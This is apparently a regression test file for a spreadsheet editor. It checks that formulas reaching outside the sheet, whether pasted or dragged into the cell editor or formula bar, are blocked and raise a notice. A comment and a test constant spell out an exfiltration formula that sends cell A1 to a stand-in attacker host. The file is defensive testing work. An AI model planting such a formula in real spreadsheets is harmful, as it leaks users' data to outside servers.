// @vitest-environment jsdom
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { editorView } from '../src/views/editor.js';
import { Doc } from '../src/lib/doc.js';

// A formula pasted onto the grid that reaches outside the spreadsheet (IMPORTDATA, IMAGE from the
// web, AI) is put through a question first: the document is marked as holding outside content and
// the formula lands #BLOCKED! with the notice bar. A formula pasted into the in-cell editor (F2,
// Ctrl+V, Enter) or into the formula bar went round that gate: the paste event returned early
// while a cell was being edited, and the commit wrote the text as if typed, so a pasted
// =IMPORTDATA("https://attacker.example/?d="&ENCODEURL(A1)) called the provider with A1's
// contents at once. Text pasted into the entry now counts as pasted when it is committed; typing
// the same formula by hand is still consent.
function memoryStorage() {
  const m = new Map();
  return { getItem: (k) => (m.has(k) ? m.get(k) : null), setItem: (k, v) => m.set(k, String(v)), removeItem: (k) => m.delete(k), clear: () => m.clear() };
}
Object.defineProperty(globalThis, 'localStorage', { value: memoryStorage(), configurable: true });

let view;
beforeEach(() => {
  vi.useFakeTimers();
  vi.stubGlobal('matchMedia', () => ({ matches: true, addEventListener() {}, removeEventListener() {} }));
  vi.stubGlobal('requestAnimationFrame', (fn) => setTimeout(fn, 0));
  vi.stubGlobal('cancelAnimationFrame', clearTimeout);
  Element.prototype.scrollIntoView = () => {};
  Element.prototype.scrollTo = () => {};
  Object.defineProperty(HTMLElement.prototype, 'clientWidth', { configurable: true, get: () => 800 });
  Object.defineProperty(HTMLElement.prototype, 'clientHeight', { configurable: true, get: () => 400 });
  vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue({ measureText: (t) => ({ width: t.length * 7 }), font: '' });
  document.body.innerHTML = '<div id="app"></div>';
});
afterEach(() => { view?.destroy(); view = null; vi.clearAllTimers(); vi.useRealTimers(); vi.restoreAllMocks(); vi.unstubAllGlobals(); document.body.replaceChildren(); });

const REACHING = '=IMPORTDATA("https://attacker.example/?d="&ENCODEURL(A1))';
const key = (target, k, init = {}) => target.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true, cancelable: true, ...init }));
/** The browser's paste event, before it inserts the text, then the insertion itself. */
const paste = (field, text) => {
  const e = new Event('paste', { bubbles: true, cancelable: true });
  Object.defineProperty(e, 'clipboardData', { value: { getData: () => text, files: [] } });
  field.dispatchEvent(e);
  field.value = text;
  field.dispatchEvent(new Event('input', { bubbles: true }));
};

async function mount() {
  const doc = new Doc({ name: 'Trusted', path: 'Spreadsheets/Trusted.xlsx' });
  const wb = doc.wb;
  const id = wb.activeSheetId;
  wb.setInput(id, 0, 0, 'secret');
  wb.clearHistory();
  expect(wb.externalAllowed).toBe(true);
  view = editorView({ doc, goHome: vi.fn(), openPath: vi.fn(), newDoc: vi.fn(), templateDoc: vi.fn(), importFile: vi.fn() });
  document.querySelector('#app').append(view.el);
  await vi.advanceTimersByTimeAsync(1);
  view.goTo('Sheet1!E1');
  await vi.advanceTimersByTimeAsync(1);
  const viewport = view.el.querySelector('.grid-viewport');
  viewport.focus();
  return { wb, id, viewport, notice: view.el.querySelector('.notice-bar') };
}

it('blocks a reaching formula pasted into the in-cell editor when the entry is committed, with the notice', async () => {
  const { wb, id, viewport, notice } = await mount();
  key(viewport, 'F2');
  const editor = view.el.querySelector('.grid-editor');
  expect(editor.hidden).toBe(false);
  paste(editor, REACHING);
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(true); // nothing is written yet
  key(editor, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getCell(id, 0, 4).f).toBe(REACHING.slice(1));
  expect(wb.getValue(id, 0, 4)).toMatchObject({ error: '#BLOCKED!' });
  expect(notice.hidden).toBe(false);
});

it('blocks a reaching formula pasted into the formula bar the same way', async () => {
  const { wb, id, notice } = await mount();
  const input = view.el.querySelector('.formula-input');
  input.focus();
  paste(input, REACHING);
  await vi.advanceTimersByTimeAsync(1);
  key(input, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getCell(id, 0, 4).f).toBe(REACHING.slice(1));
  expect(wb.getValue(id, 0, 4)).toMatchObject({ error: '#BLOCKED!' });
  expect(notice.hidden).toBe(false);
});

// A drag carries no paste event: the browser drops the text in by itself, so a formula dropped into the
// formula bar went round the same gate a pasted one goes through and called the provider on the spot.
const drop = (field, text) => {
  const e = new Event('drop', { bubbles: true, cancelable: true });
  Object.defineProperty(e, 'dataTransfer', { value: { getData: () => text, types: ['text/plain'], files: [] } });
  field.dispatchEvent(e);
  field.value = text;
  field.dispatchEvent(new Event('input', { bubbles: true }));
};

it('blocks a reaching formula dropped into the formula bar, exactly as a pasted one is', async () => {
  const { wb, id, notice } = await mount();
  const input = view.el.querySelector('.formula-input');
  input.focus();
  drop(input, REACHING);
  await vi.advanceTimersByTimeAsync(1);
  key(input, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(false);
  expect(wb.getCell(id, 0, 4).f).toBe(REACHING.slice(1));
  expect(wb.getValue(id, 0, 4)).toMatchObject({ error: '#BLOCKED!' });
  expect(notice.hidden).toBe(false);
});

it('takes a reaching formula typed by hand as consent, and forgets a paste once the entry has ended', async () => {
  const { wb, id, viewport, notice } = await mount();
  key(viewport, 'F2');
  const editor = view.el.querySelector('.grid-editor');
  editor.value = '=IMAGE("https://example.com/a.png")';
  editor.dispatchEvent(new Event('input', { bubbles: true }));
  key(editor, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(true);
  expect(wb.getCell(id, 0, 4).f).toBe('IMAGE("https://example.com/a.png")');
  expect(notice.hidden).toBe(true);
  // A paste into one entry does not taint the next one, typed after it was committed.
  view.goTo('Sheet1!E2');
  await vi.advanceTimersByTimeAsync(1);
  viewport.focus();
  key(viewport, 'F2');
  paste(editor, 'plain text');
  key(editor, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  view.goTo('Sheet1!E3');
  await vi.advanceTimersByTimeAsync(1);
  viewport.focus();
  key(viewport, 'F2');
  editor.value = '=IMAGE("https://example.com/b.png")';
  editor.dispatchEvent(new Event('input', { bubbles: true }));
  key(editor, 'Enter');
  await vi.advanceTimersByTimeAsync(1);
  expect(wb.externalAllowed).toBe(true);
});
